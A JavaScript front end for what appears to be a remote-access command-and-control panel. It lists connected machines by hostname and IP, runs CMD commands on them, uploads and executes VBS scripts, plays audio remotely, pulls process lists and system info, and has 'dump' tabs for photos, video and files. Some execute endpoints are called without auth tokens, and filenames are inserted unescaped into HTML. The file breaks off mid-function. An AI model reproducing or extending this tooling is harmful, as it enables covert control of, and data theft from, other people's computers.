// Global configuration and state
let appConfig = null;
let currentUser = null;
let isAuthenticated = false;

// Connect to external server
const SERVER_URL = 'https://back-server-z01e.onrender.com';
const socket = io(SERVER_URL);
let clients = [];
let selectedClients = new Set();
let persistentSelectedClientId = null; // Persist selected client across all tools

// DOM elements
const totalClientsEl = document.getElementById('totalClients');
const onlineClientsEl = document.getElementById('onlineClients');
const offlineClientsEl = document.getElementById('offlineClients');
const clientsListEl = document.getElementById('clientsList');
const logsEl = document.getElementById('logs');
const clearOfflineBtn = document.getElementById('clearOfflineBtn');

// Load configuration and apply branding
async function loadConfig() {
    try {
        const response = await fetch(`${SERVER_URL}/api/config`);
        appConfig = await response.json();
        applyBranding();
    } catch (error) {
        console.error('Failed to load config:', error);
    }
}

// Apply branding from config
function applyBranding() {
    if (!appConfig) return;
    
    const { branding, developer } = appConfig;
    
    // Update page title
    document.title = branding.appName;
    
    // Update navbar
    document.querySelector('nav h1').textContent = branding.appName;
    document.querySelector('nav p').textContent = branding.appTagline;
    
    // Update footer
    const footerName = document.querySelector('footer p.text-gh-text');
    const footerCountry = document.querySelector('footer p.text-gh-text-secondary');
    const footerBadge = document.querySelector('footer .bg-purple-600 span');
    const footerVersion = document.querySelector('footer p:last-child');
    
    if (footerName) footerName.textContent = `Developed by ${developer.name}`;
    if (footerCountry) footerCountry.innerHTML = `Made in ${developer.country} ${developer.countryFlag}`;
    if (footerBadge) footerBadge.textContent = developer.badge;
    if (footerVersion) footerVersion.textContent = `${branding.appName} v${branding.appVersion}`;
}

// Authentication functions
function showLoginForm() {
    document.getElementById('loginModal').classList.remove('hidden');
    document.getElementById('mainContent').classList.add('hidden');
    document.getElementById('loginUsername').focus();
}

function hideLoginForm() {
    document.getElementById('loginModal').classList.add('hidden');
    document.getElementById('mainContent').classList.remove('hidden');
    
    // Update navbar with user info
    if (currentUser) {
        updateNavbarUser();
    }
}

function updateNavbarUser() {
    const navItems = document.querySelector('nav .flex.items-center.space-x-4');
    const existingUser = document.getElementById('userDisplay');
    
    if (!existingUser && currentUser) {
        const userDisplay = document.createElement('div');
        userDisplay.id = 'userDisplay';
        userDisplay.className = 'flex items-center space-x-2 text-gh-text-secondary text-sm';
        userDisplay.innerHTML = `
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
            </svg>
            <span>Welcome, <strong class="text-gh-text">${currentUser.displayName}</strong></span>
        `;
        navItems.insertBefore(userDisplay, navItems.firstChild);
    }
}

async function login() {
    const username = document.getElementById('loginUsername').value.trim();
    const password = document.getElementById('loginPassword').value;
    const rememberMe = document.getElementById('rememberMe')?.checked || false;
    const errorEl = document.getElementById('loginError');
    const loginBtn = document.getElementById('loginBtn');
    
    if (!username || !password) {
        errorEl.textContent = 'Please enter username and password';
        errorEl.classList.remove('hidden');
        return;
    }
    
    // Clear previous errors
    errorEl.classList.add('hidden');
    loginBtn.disabled = true;
    loginBtn.innerHTML = `
        <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
        </svg>
        Authenticating...
    `;
    
    try {
        const response = await fetch(`${SERVER_URL}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ username, password, rememberMe })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            isAuthenticated = true;
            currentUser = data.user;
            localStorage.setItem('authToken', data.token);
            
            hideLoginForm();
            addLog(`✅ Welcome back, ${data.user.displayName}!`, 'success');
            
            // Load clients immediately after login
            loadClients();
            
            // Clear form
            document.getElementById('loginPassword').value = '';
        } else {
            errorEl.textContent = data.error || 'Invalid username or password';
            errorEl.classList.remove('hidden');
            document.getElementById('loginPassword').value = '';
        }
    } catch (error) {
        console.error('Login error:', error);
        errorEl.textContent = 'Connection error. Please try again.';
        errorEl.classList.remove('hidden');
    } finally {
        loginBtn.disabled = false;
        loginBtn.innerHTML = `
            <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
            </svg>
            Sign In
        `;
    }
}

async function logout() {
    try {
        await fetch(`${SERVER_URL}/api/auth/logout`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ username: currentUser?.username })
        });
    } catch (error) {
        console.error('Logout error:', error);
    }
    
    isAuthenticated = false;
    currentUser = null;
    localStorage.removeItem('authToken');
    
    // Remove user display from navbar
    const userDisplay = document.getElementById('userDisplay');
    if (userDisplay) userDisplay.remove();
    
    showLoginForm();
    addLog('Logged out successfully', 'info');
    
    // Clear sensitive data
    clients = [];
    selectedClients.clear();
    updateStats();
    renderClients();
    
    // Update Client IDs table if it's visible
    if (document.getElementById('clientIdsMainContent') && !document.getElementById('clientIdsMainContent').classList.contains('hidden')) {
        loadClientIdsTable();
    }
}

function handleLoginKeyPress(event) {
    if (event.key === 'Enter') {
        login();
    }
}

// Check authentication on page load
async function checkAuthentication() {
    const token = localStorage.getItem('authToken');
    
    if (token) {
        try {
            const response = await fetch(`${SERVER_URL}/api/auth/verify`, {
                method: 'GET',
                headers: { 
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                },
                credentials: 'include'
            });
            
            if (response.ok) {
                const data = await response.json();
                isAuthenticated = true;
                currentUser = data.user;
                hideLoginForm();
                addLog(`✅ Session restored - Welcome back, ${data.user.displayName}!`, 'success');
                
                // Load clients
                loadClients();
                
                return;
            }
        } catch (error) {
            console.error('Auth verification error:', error);
        }
        
        // Token invalid, clear and show login
        localStorage.removeItem('authToken');
    }
    
    showLoginForm();
}

// Initialize app
async function initApp() {
    await loadConfig();
    await checkAuthentication();
}

// Run on page load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
} else {
    initApp();
}

// Socket event listeners
socket.on('connect', () => {
    addLog('Connected to server', 'success');
    if (isAuthenticated) {
        loadClients();
    }
});

socket.on('disconnect', () => {
    addLog('Disconnected from server', 'error');
});

socket.on('clientsUpdated', (updatedClients) => {
    if (!isAuthenticated) return;
    
    clients = updatedClients;
    
    // Clear persistent selection if client went offline
    if (persistentSelectedClientId) {
        const selectedClient = clients.find(c => c.id === persistentSelectedClientId);
        if (!selectedClient || !selectedClient.connected) {
            persistentSelectedClientId = null;
            addLog('Selected client went offline - selection cleared', 'info');
        }
    }
    
    updateStats();
    renderClients();
    addLog(`Client list updated - ${clients.filter(c => c.connected).length} online`);
    
    // Update Client IDs table if it's visible
    if (document.getElementById('clientIdsMainContent') && !document.getElementById('clientIdsMainContent').classList.contains('hidden')) {
        loadClientIdsTable();
    }
});

socket.on('commandResult', (result) => {
    const client = clients.find(c => c.id === result.clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    if (result.success) {
        addLog(`✅ ${result.command} executed successfully on ${hostname}`, 'success');
    } else {
        addLog(`❌ ${result.command} failed on ${hostname}: ${result.error}`, 'error');
    }
    
    // Handle CMD terminal output
    if (currentCmdClientId === result.clientId && result.commandId) {
        addCmdOutput(`> ${result.command}`, 'command');
        if (result.success) {
            addCmdOutput(result.output || 'Command executed successfully', 'output');
        } else {
            addCmdOutput(`Error: ${result.error}`, 'error');
        }
    }
});

// Handle system info results
socket.on('systemInfoResult', (result) => {
    const client = clients.find(c => c.id === result.clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    addLog(`System info received from ${hostname}`, 'success');
    displaySystemInfo(result);
});

// Handle process list results
socket.on('processListResult', (result) => {
    const client = clients.find(c => c.id === result.clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    addLog(`Process list received from ${hostname} - ${result.processes.length} processes`, 'success');
    displayProcessList(result);
});

// Handle user deletion event
socket.on('userDeleted', (data) => {
    if (currentUser && currentUser.username === data.username) {
        alert('Your account has been deleted by an administrator. You will be logged out.');
        logout();
    }
});

// Handle user disabled event
socket.on('userDisabled', (data) => {
    if (currentUser && currentUser.username === data.username) {
        alert('Your account has been disabled by an administrator. You will be logged out.');
        logout();
    }
});

// Audio playback function
async function playAudioOnClient() {
    const audioFileInput = document.getElementById('audioFileInput');
    const audioClientSelect = document.getElementById('audioClientSelect');
    const playAudioBtn = document.getElementById('playAudioBtn');
    
    const clientId = audioClientSelect.value;
    const file = audioFileInput.files[0];
    
    // Validation
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!file) {
        alert('Please select a .wav file');
        return;
    }
    
    if (!file.name.toLowerCase().endsWith('.wav')) {
        alert('Only .wav files are supported');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    // Disable button during upload
    playAudioBtn.disabled = true;
    playAudioBtn.innerHTML = `
        <span class="flex items-center justify-center space-x-2">
            <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span>Uploading...</span>
        </span>
    `;
    
    try {
        // Create FormData and append file
        const formData = new FormData();
        formData.append('audioFile', file);
        
        // Send to server
        const response = await fetch(`${SERVER_URL}/api/play-audio/${clientId}`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`🎵 Audio "${result.filename}" sent to ${hostname} (saved to library)`, 'success');
            // Clear file input
            audioFileInput.value = '';
            // Refresh libraries in other tabs
            setTimeout(() => {
                loadAudioLibrary();
                loadFilesLibrary();
            }, 500);
        } else {
            addLog(`Failed to send audio to ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to upload audio file: ${error.message}`, 'error');
    } finally {
        // Re-enable button
        playAudioBtn.disabled = false;
        playAudioBtn.innerHTML = `
            <span class="flex items-center justify-center space-x-2">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                <span>Play Audio on Client</span>
            </span>
        `;
    }
}

// Load initial client data
async function loadClients() {
    if (!isAuthenticated) return;
    try {
        const token = localStorage.getItem('authToken');
        const response = await fetch(`${SERVER_URL}/api/clients`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            credentials: 'include'
        });
        
        if (response.status === 401) {
            // Token expired, logout
            await logout();
            return;
        }
        
        clients = await response.json();
        updateStats();
        renderClients();
        
        // Update Client IDs table if it's visible
        if (document.getElementById('clientIdsMainContent') && !document.getElementById('clientIdsMainContent').classList.contains('hidden')) {
            loadClientIdsTable();
        }
    } catch (error) {
        console.error('Failed to load clients:', error);
        addLog('Failed to load clients', 'error');
    }
}

// Update statistics
function updateStats() {
    const online = clients.filter(c => c.connected).length;
    const offline = clients.length - online;
    
    totalClientsEl.textContent = clients.length;
    onlineClientsEl.textContent = online;
    offlineClientsEl.textContent = offline;
    
    // Update audio client select dropdown
    updateAudioClientSelect();
}

// Update audio client select dropdown
function updateAudioClientSelect() {
    const audioClientSelect = document.getElementById('audioClientSelect');
    const audioClientSelectLibrary = document.getElementById('audioClientSelectLibrary');
    const audioDumpClientSelect = document.getElementById('audioDumpClientSelect');
    const vbsClientSelect = document.getElementById('vbsClientSelect');
    const vbsClientSelectLibrary = document.getElementById('vbsClientSelectLibrary');
    const vbsDumpClientSelect = document.getElementById('vbsDumpClientSelect');
    const videoClientSelect = document.getElementById('videoClientSelect');
    const videoClientSelectLibrary = document.getElementById('videoClientSelectLibrary');
    const videoDumpClientSelect = document.getElementById('videoDumpClientSelect');
    const filesClientSelect = document.getElementById('filesClientSelect');
    const filesClientSelectLibrary = document.getElementById('filesClientSelectLibrary');
    const dumpClientSelect = document.getElementById('dumpClientSelect');
    const photosClientSelect = document.getElementById('photosClientSelect');
    const photosClientSelectLibrary = document.getElementById('photosClientSelectLibrary');
    const photosDumpClientSelect = document.getElementById('photosDumpClientSelect');
    
    const onlineClients = clients.filter(c => c.connected);
    const options = '<option value="">-- Select a client --</option>' +
        onlineClients.map(client => {
            const badge = client.id.startsWith('client') ? ' ✨ Latest' : '';
            return `<option value="${client.id}">${client.hostname} (${client.ip})${badge}</option>`;
        }).join('');
    
    if (audioClientSelect) {
        audioClientSelect.innerHTML = options;
        if (persistentSelectedClientId) audioClientSelect.value = persistentSelectedClientId;
    }
    if (audioClientSelectLibrary) {
        audioClientSelectLibrary.innerHTML = options;
        if (persistentSelectedClientId) audioClientSelectLibrary.value = persistentSelectedClientId;
    }
    if (vbsClientSelect) {
        vbsClientSelect.innerHTML = options;
        if (persistentSelectedClientId) vbsClientSelect.value = persistentSelectedClientId;
    }
    if (vbsClientSelectLibrary) {
        vbsClientSelectLibrary.innerHTML = options;
        if (persistentSelectedClientId) vbsClientSelectLibrary.value = persistentSelectedClientId;
    }
    if (videoClientSelect) {
        videoClientSelect.innerHTML = options;
        if (persistentSelectedClientId) videoClientSelect.value = persistentSelectedClientId;
    }
    if (videoClientSelectLibrary) {
        videoClientSelectLibrary.innerHTML = options;
        if (persistentSelectedClientId) videoClientSelectLibrary.value = persistentSelectedClientId;
    }
    if (filesClientSelect) {
        filesClientSelect.innerHTML = options;
        if (persistentSelectedClientId) filesClientSelect.value = persistentSelectedClientId;
    }
    if (filesClientSelectLibrary) {
        filesClientSelectLibrary.innerHTML = options;
        if (persistentSelectedClientId) filesClientSelectLibrary.value = persistentSelectedClientId;
    }
    if (audioDumpClientSelect) {
        audioDumpClientSelect.innerHTML = options;
        if (persistentSelectedClientId) audioDumpClientSelect.value = persistentSelectedClientId;
    }
    if (vbsDumpClientSelect) {
        vbsDumpClientSelect.innerHTML = options;
        if (persistentSelectedClientId) vbsDumpClientSelect.value = persistentSelectedClientId;
    }
    if (videoDumpClientSelect) {
        videoDumpClientSelect.innerHTML = options;
        if (persistentSelectedClientId) videoDumpClientSelect.value = persistentSelectedClientId;
    }
    if (dumpClientSelect) {
        dumpClientSelect.innerHTML = options;
        if (persistentSelectedClientId) dumpClientSelect.value = persistentSelectedClientId;
    }
    if (photosClientSelect) {
        photosClientSelect.innerHTML = options;
        if (persistentSelectedClientId) photosClientSelect.value = persistentSelectedClientId;
    }
    if (photosClientSelectLibrary) {
        photosClientSelectLibrary.innerHTML = options;
        if (persistentSelectedClientId) photosClientSelectLibrary.value = persistentSelectedClientId;
    }
    if (photosDumpClientSelect) {
        photosDumpClientSelect.innerHTML = options;
        if (persistentSelectedClientId) photosDumpClientSelect.value = persistentSelectedClientId;
    }
}

// Audio tab switching
function switchAudioTab(tab) {
    const uploadTabBtn = document.getElementById('uploadTabBtn');
    const libraryTabBtn = document.getElementById('libraryTabBtn');
    const audioDumpTabBtn = document.getElementById('audioDumpTabBtn');
    const uploadTabContent = document.getElementById('uploadTabContent');
    const libraryTabContent = document.getElementById('libraryTabContent');
    const audioDumpTabContent = document.getElementById('audioDumpTabContent');
    
    // Reset all
    uploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    libraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    audioDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    uploadTabContent.classList.add('hidden');
    libraryTabContent.classList.add('hidden');
    audioDumpTabContent.classList.add('hidden');
    
    if (tab === 'upload') {
        uploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-indigo-600 text-white';
        uploadTabContent.classList.remove('hidden');
    } else if (tab === 'library') {
        libraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-indigo-600 text-white';
        libraryTabContent.classList.remove('hidden');
        loadAudioLibrary();
    } else if (tab === 'dump') {
        audioDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-yellow-600 text-white';
        audioDumpTabContent.classList.remove('hidden');
    }
}

// Load audio library
async function loadAudioLibrary() {
    const audioLibraryList = document.getElementById('audioLibraryList');
    audioLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">Loading audio files...</p>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/audio-files`);
        const files = await response.json();
        
        if (files.length === 0) {
            audioLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No audio files uploaded yet</p>';
            return;
        }
        
        audioLibraryList.innerHTML = files.map(file => `
            <div class="bg-gh-bg-tertiary rounded-lg p-3 border border-gh-border flex items-center justify-between hover:border-gh-text-muted transition-colors">
                <div class="flex items-center space-x-3 flex-1">
                    <div class="w-10 h-10 bg-indigo-900 rounded-lg flex items-center justify-center">
                        <svg class="w-5 h-5 text-indigo-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19V6l12-3v13M9 19c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zm12-3c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zM9 10l12-3"></path>
                        </svg>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="text-gh-text text-sm font-medium truncate">${file.filename}</p>
                        <p class="text-gh-text-muted text-xs">${formatFileSize(file.size)} • ${new Date(file.uploadedAt).toLocaleString()}</p>
                    </div>
                </div>
                <div class="flex items-center space-x-2">
                    <button 
                        onclick="playAudioFromLibrary('${file.filename}')"
                        class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-2 rounded-lg text-xs font-semibold transition-colors"
                    >
                        Play
                    </button>
                    <button 
                        onclick="deleteAudioFile('${file.filename}')"
                        class="bg-red-900 hover:bg-red-800 text-red-300 px-3 py-2 rounded-lg text-xs font-semibold transition-colors border border-red-700"
                    >
                        Delete
                    </button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        audioLibraryList.innerHTML = '<p class="text-red-300 text-sm text-center py-4">Failed to load audio files</p>';
        addLog('Failed to load audio library', 'error');
    }
}

// Format file size
function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    else if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    else return (bytes / 1048576).toFixed(1) + ' MB';
}

// Play audio from library
async function playAudioFromLibrary(filename) {
    const audioClientSelectLibrary = document.getElementById('audioClientSelectLibrary');
    const clientId = audioClientSelectLibrary.value;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/play-audio-library/${clientId}/${encodeURIComponent(filename)}`, {
            method: 'POST'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`🔊 Playing "${filename}" on ${hostname}`, 'success');
        } else {
            addLog(`Failed to play audio on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to play audio: ${error.message}`, 'error');
    }
}

// Delete audio file
async function deleteAudioFile(filename) {
    if (!confirm(`Delete "${filename}" from library?`)) {
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_URL}/api/audio-files/${encodeURIComponent(filename)}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`Deleted audio file: ${filename}`, 'success');
            loadAudioLibrary(); // Reload library
        } else {
            addLog(`Failed to delete ${filename}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to delete audio file: ${error.message}`, 'error');
    }
}

// ========== VBS Script Functions ==========

// VBS tab switching
function switchVbsTab(tab) {
    const vbsUploadTabBtn = document.getElementById('vbsUploadTabBtn');
    const vbsLibraryTabBtn = document.getElementById('vbsLibraryTabBtn');
    const vbsDumpTabBtn = document.getElementById('vbsDumpTabBtn');
    const vbsUploadTabContent = document.getElementById('vbsUploadTabContent');
    const vbsLibraryTabContent = document.getElementById('vbsLibraryTabContent');
    const vbsDumpTabContent = document.getElementById('vbsDumpTabContent');
    
    // Reset all
    vbsUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    vbsLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    vbsDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    vbsUploadTabContent.classList.add('hidden');
    vbsLibraryTabContent.classList.add('hidden');
    vbsDumpTabContent.classList.add('hidden');
    
    if (tab === 'upload') {
        vbsUploadTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-teal-600 text-white';
        vbsUploadTabContent.classList.remove('hidden');
    } else if (tab === 'library') {
        vbsLibraryTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-teal-600 text-white';
        vbsLibraryTabContent.classList.remove('hidden');
        loadVbsLibrary();
    } else if (tab === 'dump') {
        vbsDumpTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-yellow-600 text-white';
        vbsDumpTabContent.classList.remove('hidden');
    }
}

// Execute VBS on client (upload new)
async function executeVbsOnClient() {
    const vbsFileInput = document.getElementById('vbsFileInput');
    const vbsClientSelect = document.getElementById('vbsClientSelect');
    const executeVbsBtn = document.getElementById('executeVbsBtn');
    
    const clientId = vbsClientSelect.value;
    const file = vbsFileInput.files[0];
    
    // Validation
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    if (!file) {
        alert('Please select a .vbs file');
        return;
    }
    
    if (!file.name.toLowerCase().endsWith('.vbs')) {
        alert('Only .vbs files are supported');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    // Disable button during upload
    executeVbsBtn.disabled = true;
    executeVbsBtn.innerHTML = `
        <span class="flex items-center justify-center space-x-2">
            <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span>Uploading...</span>
        </span>
    `;
    
    try {
        // Create FormData and append file
        const formData = new FormData();
        formData.append('vbsFile', file);
        
        // Send to server
        const response = await fetch(`${SERVER_URL}/api/execute-vbs/${clientId}`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`⚡ VBS script "${result.filename}" executed on ${hostname} (saved to library)`, 'success');
            // Clear file input
            vbsFileInput.value = '';
            // Refresh libraries in other tabs
            setTimeout(() => {
                loadVbsLibrary();
                loadFilesLibrary();
            }, 500);
        } else {
            addLog(`Failed to execute VBS on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to upload VBS file: ${error.message}`, 'error');
    } finally {
        // Re-enable button
        executeVbsBtn.disabled = false;
        executeVbsBtn.innerHTML = `
            <span class="flex items-center justify-center space-x-2">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                </svg>
                <span>Upload & Execute</span>
            </span>
        `;
    }
}

// Load VBS library
async function loadVbsLibrary() {
    const vbsLibraryList = document.getElementById('vbsLibraryList');
    vbsLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">Loading VBS scripts...</p>';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/vbs-files`);
        const files = await response.json();
        
        if (files.length === 0) {
            vbsLibraryList.innerHTML = '<p class="text-gh-text-secondary text-sm text-center py-4">No VBS scripts uploaded yet</p>';
            return;
        }
        
        vbsLibraryList.innerHTML = files.map(file => `
            <div class="bg-gh-bg-tertiary rounded-lg p-3 border border-gh-border flex items-center justify-between hover:border-gh-text-muted transition-colors">
                <div class="flex items-center space-x-3 flex-1">
                    <div class="w-10 h-10 bg-teal-900 rounded-lg flex items-center justify-center">
                        <svg class="w-5 h-5 text-teal-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
                        </svg>
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="text-gh-text text-sm font-medium truncate">${file.filename}</p>
                        <p class="text-gh-text-muted text-xs">${formatFileSize(file.size)} • ${new Date(file.uploadedAt).toLocaleString()}</p>
                    </div>
                </div>
                <div class="flex items-center space-x-2">
                    <button 
                        onclick="executeVbsFromLibrary('${file.filename}')"
                        class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-2 rounded-lg text-xs font-semibold transition-colors"
                    >
                        Execute
                    </button>
                    <button 
                        onclick="deleteVbsFile('${file.filename}')"
                        class="bg-red-900 hover:bg-red-800 text-red-300 px-3 py-2 rounded-lg text-xs font-semibold transition-colors border border-red-700"
                    >
                        Delete
                    </button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        vbsLibraryList.innerHTML = '<p class="text-red-300 text-sm text-center py-4">Failed to load VBS scripts</p>';
        addLog('Failed to load VBS library', 'error');
    }
}

// Execute VBS from library
async function executeVbsFromLibrary(filename) {
    const vbsClientSelectLibrary = document.getElementById('vbsClientSelectLibrary');
    const clientId = vbsClientSelectLibrary.value;
    
    if (!clientId) {
        alert('Please select a target client');
        return;
    }
    
    const client = clients.find(c => c.id === clientId);
    const hostname = client ? client.hostname : 'Unknown';
    
    try {
        const response = await fetch(`${SERVER_URL}/api/execute-vbs-library/${clientId}/${encodeURIComponent(filename)}`, {
            method: 'POST'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`⚡ Executing "${filename}" on ${hostname}`, 'success');
        } else {
            addLog(`Failed to execute VBS on ${hostname}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to execute VBS: ${error.message}`, 'error');
    }
}

// Delete VBS file
async function deleteVbsFile(filename) {
    if (!confirm(`Delete "${filename}" from library?`)) {
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_URL}/api/vbs-files/${encodeURIComponent(filename)}`, {
            method: 'DELETE'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            addLog(`Deleted VBS script: ${filename}`, 'success');
            loadVbsLibrary(); // Reload library
        } else {
            addLog(`Failed to delete ${filename}: ${result.error}`, 'error');
        }
    } catch (error) {
        addLog(`Failed to delete VBS file: ${error.message}`, 'error');
    }
}

// ========== Other Tools Tab Navigation ==========

function switchOtherMainTab(tool) {
    // Update button styles
    const audioMainTabBtn = document.getElementById('audioMainTabBtn');
    const vbsMainTabBtn = document.getElementById('vbsMainTabBtn');
    const videoMainTabBtn = document.getElementById('videoMainTabBtn');
    const filesMainTabBtn = document.getElementById('filesMainTabBtn');
    const photosMainTabBtn = document.getElementById('photosMainTabBtn');
    const clientIdsMainTabBtn = document.getElementById('clientIdsMainTabBtn');
    const blocklistMainTabBtn = document.getElementById('blocklistMainTabBtn');
    
    // Update content visibility
    const audioMainContent = document.getElementById('audioMainContent');
    const vbsMainContent = document.getElementById('vbsMainContent');
    const videoMainContent = document.getElementById('videoMainContent');
    const filesMainContent = document.getElementById('filesMainContent');
    const photosMainContent = document.getElementById('photosMainContent');
    const clientIdsMainContent = document.getElementById('clientIdsMainContent');
    const blocklistMainContent = document.getElementById('blocklistMainContent');
    
    // Reset all
    audioMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
    vbsMainTabBtn.className = 'flex-1 py-2 px-4 rounded-lg font-semibold text-sm transition-colors duration-200 bg-gh-bg-tertiary text-gh-text-secondary hover:bg-gh-border';
